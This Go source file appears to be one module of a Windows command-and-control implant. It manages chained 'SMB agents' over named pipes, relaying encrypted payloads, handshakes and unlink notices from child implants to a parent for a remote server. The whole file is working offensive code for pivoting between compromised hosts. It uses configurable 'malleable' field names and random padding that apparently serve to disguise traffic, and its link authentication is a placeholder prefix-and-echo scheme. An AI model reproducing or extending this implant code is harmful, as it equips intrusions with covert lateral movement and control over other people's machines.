//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Template indices for link manager strings (must match server's common.go)
const (
	idxLinkKeyType      = 133
	idxLinkKeyPayload   = 134
	idxLinkMsgData      = 135
	idxLinkMsgDisconn   = 136
	idxLinkMsgHandshake = 137
	idxLinkMsgPing      = 138
	idxLinkMsgPong      = 139
	idxLinkStatusActive = 340
	idxLinkStatusInact  = 341
	idxLinkAuthPrefix   = 342
	idxLinkAuthOK       = 343
	idxLinkFmtList      = 344
	idxLinkFmtRow       = 345
	idxLinkTimeFmt      = 346
)

// Template storage for link manager strings
var linkManagerTemplate []string
var linkManagerTemplateMu sync.RWMutex

// SetLinkManagerTemplate stores the template for link manager operations
func SetLinkManagerTemplate(templates []string) {
	linkManagerTemplateMu.Lock()
	linkManagerTemplate = templates
	linkManagerTemplateMu.Unlock()
}

// lmTpl retrieves a template string by index
func lmTpl(idx int) string {
	linkManagerTemplateMu.RLock()
	tpl := linkManagerTemplate
	linkManagerTemplateMu.RUnlock()

	if tpl != nil && idx < len(tpl) {
		return tpl[idx]
	}
	return ""
}

// Convenience functions for link manager strings
func lmKeyType() string       { return lmTpl(idxLinkKeyType) }
func lmKeyPayload() string    { return lmTpl(idxLinkKeyPayload) }
func lmTypeData() string      { return lmTpl(idxLinkMsgData) }
func lmTypeDisconn() string   { return lmTpl(idxLinkMsgDisconn) }
func lmTypeHandshake() string { return lmTpl(idxLinkMsgHandshake) }
func lmStatusActive() string  { return lmTpl(idxLinkStatusActive) }
func lmStatusInact() string   { return lmTpl(idxLinkStatusInact) }
func lmAuthPrefix() string    { return lmTpl(idxLinkAuthPrefix) }
func lmAuthOK() string        { return lmTpl(idxLinkAuthOK) }
func lmFmtLinks() string      { return lmTpl(idxLinkFmtList) }
func lmFmtLinkRow() string    { return lmTpl(idxLinkFmtRow) }
func lmTimeFmt() string       { return lmTpl(idxLinkTimeFmt) }

// Timeout configuration for linked agent communication
const (
	linkWriteTimeout = 60 * time.Second  // Timeout for writing to linked agents
	linkReadTimeout  = 120 * time.Second // Timeout for reading from linked agents
)

// LinkedAgent represents a connected SMB agent (child link)
type LinkedAgent struct {
	RoutingID         string    // Short routing ID (assigned by this agent)
	PipePath          string    // Full pipe path (\\server\pipe\name)
	Conn              net.Conn  // Active pipe connection
	Connected         time.Time // When the link was established
	LastSeen          time.Time // Last successful communication
	IsActive          bool      // Whether the link is active
	AwaitingHandshake bool      // True after auth, false after first message (for state-based routing)
	mu                sync.Mutex
}

// LinkManager manages connections to linked SMB agents (child links)
type LinkManager struct {
	mu           sync.RWMutex
	links        map[string]*LinkedAgent // routingID -> LinkedAgent
	pipeToRoute  map[string]string       // pipePath -> routingID (for dedup)
	nextID       uint32                  // Atomic counter for generating routing IDs
	outboundData chan *LinkDataOut       // Data received from linked agents, to be sent up the chain
	handshakeData chan *LinkDataOut      // Handshake data from new linked agents (sent via "lh" field)

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *LinkDataOut // routingID -> response channel
	responseMu       sync.RWMutex

	// Unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// LinkDataOut represents data from a linked agent to be forwarded up the chain
type LinkDataOut struct {
	RoutingID     string `json:"r"`            // Routing ID
	Payload       string `json:"p"`            // Base64 encoded, encrypted payload (or opaque transformed blob)
	PrependLength int    `json:"pl,omitempty"` // Random prepend length for transform reversal
	AppendLength  int    `json:"al,omitempty"` // Random append length for transform reversal
}

// LinkDataIn represents data from the server destined for a linked agent
type LinkDataIn struct {
	RoutingID string `json:"r"` // Routing ID
	Payload   string `json:"p"` // Base64 encoded payload
}

// ToMalleableMap converts LinkDataOut to a map using configurable field names
// This avoids hardcoded JSON struct tags when marshaling
func (ld *LinkDataOut) ToMalleableMap() map[string]interface{} {
	m := map[string]interface{}{
		MALLEABLE_ROUTING_ID_FIELD: ld.RoutingID,
		MALLEABLE_PAYLOAD_FIELD:    ld.Payload,
	}
	if ld.PrependLength > 0 {
		m["pl"] = ld.PrependLength
	}
	if ld.AppendLength > 0 {
		m["al"] = ld.AppendLength
	}
	return m
}

// ConvertLinkDataToMaps converts a slice of LinkDataOut to maps with malleable field names
func ConvertLinkDataToMaps(data []*LinkDataOut) []map[string]interface{} {
	if data == nil {
		return nil
	}
	result := make([]map[string]interface{}, len(data))
	for i, ld := range data {
		result[i] = ld.ToMalleableMap()
	}
	return result
}

var (
	smbLinkManager     *LinkManager
	smbLinkManagerOnce sync.Once
)

// GetLinkManager returns the singleton link manager
func GetLinkManager() *LinkManager {
	smbLinkManagerOnce.Do(func() {
		smbLinkManager = &LinkManager{
			links:               make(map[string]*LinkedAgent),
			pipeToRoute:         make(map[string]string),
			outboundData:        make(chan *LinkDataOut, 100),
			handshakeData:       make(chan *LinkDataOut, 10),
			responseChannels:    make(map[string]chan *LinkDataOut),
			unlinkNotifications: make(chan string, 100),
		}
	})
	return smbLinkManager
}

// GenerateRoutingID creates a short, unique routing ID
func (lm *LinkManager) GenerateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// Link establishes a connection to another SMB agent via named pipe
func (lm *LinkManager) Link(pipePath string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this pipe
	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf(Err(E5))
		}
	}

	// Connect to the named pipe
	conn, err := connectToPipe(pipePath)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Perform lightweight authentication with the SMB agent
	if err := performLinkAuth(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.GenerateRoutingID()

	// Create linked agent entry
	link := &LinkedAgent{
		RoutingID:         routingID,
		PipePath:          pipePath,
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		AwaitingHandshake: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.pipeToRoute[pipePath] = routingID

	// Start goroutine to handle incoming data from the SMB agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// Unlink disconnects from an SMB agent
func (lm *LinkManager) Unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent up the chain
	select {
	case lm.unlinkNotifications <- routingID:
	default:
	}

	// Remove from maps
	delete(lm.pipeToRoute, link.PipePath)
	delete(lm.links, routingID)

	return nil
}

// GetLink returns a linked agent by routing ID
func (lm *LinkManager) GetLink(routingID string) (*LinkedAgent, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// GetActiveLinks returns all active linked agents
func (lm *LinkManager) GetActiveLinks() []*LinkedAgent {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*LinkedAgent
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// ForwardToLinkedAgent sends data from parent to a linked (child) agent
// If transformed=true, the payload is base64-encoded transformed data that should be
// sent as raw bytes (the child will reverse transforms). Otherwise, wrap in JSON envelope.
func (lm *LinkManager) ForwardToLinkedAgent(routingID string, payload string, transformed bool) error {
	link, exists := lm.GetLink(routingID)
	if !exists {
		return fmt.Errorf(Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf(Err(E4))
	}

	var data []byte
	var err error

	if transformed {
		// Payload has transforms applied by server - decode and send raw bytes
		data, err = base64.StdEncoding.DecodeString(payload)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	} else {
		// Legacy mode - wrap payload in JSON envelope
		message := map[string]string{}
		message[lmKeyType()] = lmTypeData()
		message[lmKeyPayload()] = payload

		data, err = json.Marshal(message)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	}

	// Write length-prefixed message with timeout
	link.Conn.SetWriteDeadline(time.Now().Add(linkWriteTimeout))
	if err := writeMessage(link.Conn, data); err != nil {
		link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline
		link.IsActive = false
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}
	link.Conn.SetWriteDeadline(time.Time{}) // Clear deadline

	link.LastSeen = time.Now()
	return nil
}

// ForwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
// Returns the response payload or error if timeout occurs
// If transformed=true, the payload is base64-encoded transformed data that should be sent as raw bytes
func (lm *LinkManager) ForwardToLinkedAgentAndWait(routingID string, payload string, transformed bool, timeout time.Duration) (*LinkDataOut, error) {
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	if err := lm.ForwardToLinkedAgent(routingID, payload, transformed); err != nil {
		return nil, err
	}

	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil
	}
}

// WaitForLinkData waits for data from a specific routing ID with timeout
// Used after posting to server to wait for handshake response
func (lm *LinkManager) WaitForLinkData(routingID string, timeout time.Duration) (*LinkDataOut, error) {
	// Create a response channel for this routing ID
	respChan := make(chan *LinkDataOut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	// Clean up when done
	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, fmt.Errorf(Err(E9))
	}
}

// GetOutboundData returns data that needs to be sent up the chain to parent
func (lm *LinkManager) GetOutboundData() []*LinkDataOut {
	var data []*LinkDataOut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// GetHandshakeData returns a single handshake to send to parent (via "lh" field)
// Returns nil if no handshake is pending
func (lm *LinkManager) GetHandshakeData() *LinkDataOut {
	select {
	case handshake := <-lm.handshakeData:
		return handshake
	default:
		return nil
	}
}

// GetUnlinkNotifications returns routing IDs that have been unlinked and need to be reported up the chain
func (lm *LinkManager) GetUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			notifications = append(notifications, routingID)
		default:
			return notifications
		}
	}
}

// handleIncomingData reads data from a linked agent and queues it for the parent
func (lm *LinkManager) handleIncomingData(link *LinkedAgent) {
	defer func() {
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
	}()

	for {
		data, err := readMessage(link.Conn)
		if err != nil {
			return
		}

		// Try to parse as JSON
		var message map[string]string
		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType()] != "" {
			msgType := message[lmKeyType()]

			switch msgType {
			case lmTypeData():
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload()],
				}
				lm.deliverOutbound(link, outbound)

				link.mu.Lock()
				link.AwaitingHandshake = false
				link.mu.Unlock()

			case lmTypeHandshake():
				outbound := &LinkDataOut{
					RoutingID: link.RoutingID,
					Payload:   message[lmKeyPayload()],
				}
				lm.queueHandshakeData(outbound)

				link.mu.Lock()
				link.AwaitingHandshake = false
				link.mu.Unlock()

			case lmTypeDisconn():
				return
			}
		} else {
			// Not valid JSON - treat as raw transformed data
			link.mu.Lock()
			isHandshake := link.AwaitingHandshake
			link.AwaitingHandshake = false
			link.mu.Unlock()

			outbound := &LinkDataOut{
				RoutingID: link.RoutingID,
				Payload:   base64.StdEncoding.EncodeToString(data),
			}

			if isHandshake {
				lm.queueHandshakeData(outbound)
			} else {
				lm.deliverOutbound(link, outbound)
			}
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// deliverOutbound delivers data to synchronous waiter or queues for async processing
func (lm *LinkManager) deliverOutbound(link *LinkedAgent, outbound *LinkDataOut) {
	lm.responseMu.RLock()
	respChan, hasSyncWaiter := lm.responseChannels[link.RoutingID]
	lm.responseMu.RUnlock()

	if hasSyncWaiter {
		select {
		case respChan <- outbound:
		default:
			lm.queueOutboundData(outbound)
		}
	} else {
		lm.queueOutboundData(outbound)
	}
}

// queueOutboundData is a helper to queue data for async delivery to parent
func (lm *LinkManager) queueOutboundData(outbound *LinkDataOut) {
	select {
	case lm.outboundData <- outbound:
	default:
		// Channel full, data dropped
	}
}

// queueHandshakeData is a helper to queue handshake data for async delivery to parent via "lh" field
func (lm *LinkManager) queueHandshakeData(data *LinkDataOut) {
	select {
	case lm.handshakeData <- data:
	default:
	}
}

// ListLinks returns a summary of all linked agents
func (lm *LinkManager) ListLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf(lmFmtLinks(), len(lm.links))
	for routingID, link := range lm.links {
		status := lmStatusActive()
		if !link.IsActive {
			status = lmStatusInact()
		}
		result += fmt.Sprintf(lmFmtLinkRow(),
			routingID, link.PipePath, status,
			link.Connected.Format(lmTimeFmt()),
			link.LastSeen.Format(lmTimeFmt()))
	}
	return result
}

// Helper functions for pipe communication

func connectToPipe(pipePath string) (net.Conn, error) {
	// Use DialTimeout for Windows named pipes
	timeout := 30 * time.Second
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn, err := dialPipe(pipePath)
		if err == nil {
			return conn, nil
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil, fmt.Errorf(Err(E9))
}

func performLinkAuth(conn net.Conn) error {
	// Lightweight authentication:
	// 1. Read challenge from SMB agent
	// 2. Sign with our key
	// 3. Send response

	// Set deadline for auth
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{}) // Clear deadline

	// Read challenge
	challenge, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Simple challenge-response for now
	// In production, use proper crypto
	response := append([]byte(lmAuthPrefix()), challenge...)

	if err := writeMessage(conn, response); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Read confirmation
	confirm, err := readMessage(conn)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	if string(confirm) != lmAuthOK() {
		return fmt.Errorf(Err(E3))
	}

	return nil
}

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{}
	message[lmKeyType()] = lmTypeDisconn()
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Set read deadline to prevent indefinite blocking
	conn.SetReadDeadline(time.Now().Add(linkReadTimeout))
	defer conn.SetReadDeadline(time.Time{}) // Clear deadline when done

	// Read 4-byte length header
	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf(Err(E2))
	}

	// Read data
	data := make([]byte, length)
	totalRead := 0
	for totalRead < int(length) {
		n, err := conn.Read(data[totalRead:])
		if err != nil {
			return nil, err
		}
		totalRead += n
	}

	return data, nil
}
